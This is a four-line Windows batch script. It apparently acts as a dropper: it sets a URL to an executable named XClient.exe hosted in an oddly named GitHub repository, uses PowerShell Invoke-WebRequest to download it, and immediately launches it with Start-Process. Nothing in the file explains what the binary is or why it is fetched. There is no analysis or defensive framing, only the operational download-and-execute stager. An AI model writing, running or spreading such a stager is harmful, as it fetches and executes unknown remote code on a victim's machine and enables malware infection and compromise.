@echo off
set "Url=https://github.com/Paco321312312/cautious-sniffle/raw/main/XClient.exe"
set "Filename=XClient.exe"
@powershell -Command "Invoke-WebRequest %Url% -Outfile %Filename%; Start-Process XClient.exe"